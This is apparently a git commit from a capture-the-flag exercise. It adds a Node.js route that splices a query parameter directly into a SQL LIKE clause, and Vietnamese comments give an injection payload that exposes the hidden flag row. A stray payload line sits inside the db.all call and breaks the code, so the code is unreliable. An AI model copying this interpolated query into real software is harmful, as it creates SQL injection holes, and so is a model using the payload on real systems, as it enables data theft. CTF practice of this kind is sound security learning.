1aeadec58b4ca222a3662e128f95d78439f54004
Spycio.Kon <77606941+tiyeume25112004@users.noreply.github.com>
2022-12-26 20:30:59 +0700

    Create IUHCM_CTF_SQLI.mjs

---
+++ IUHCM_CTF_SQLI.mjs
@@ -0,0 +1,18 @@
+app.get('/', (req, res) => {
+    const keyword = req.query.keyword || ''
+    const tasks = []
+
+    db.all(`SELECT name FROM tasks
+        WHERE name NOT LIKE "INFORSECIU{%" AND name LIKE "%${keyword}%";`,
+        -1" or name like  "INFORSECIU
+        (_, rows) => {
+            res.render('index', {
+                keyword,
+                tasks: rows.map(row => row.name),
+            })
+        },
+    )
+})
+// payload: -1" or select name like "INFORSECIU{
+// câu lệnh nó sẽ như này `SELECT name FROM tasks WHERE name NOT LIKE "INFORSECIU{%" AND name LIKE "-1" or select name like "INFORSECIU{%" `
+                                          //                           ----------------False-----------    ---------------true------------- 
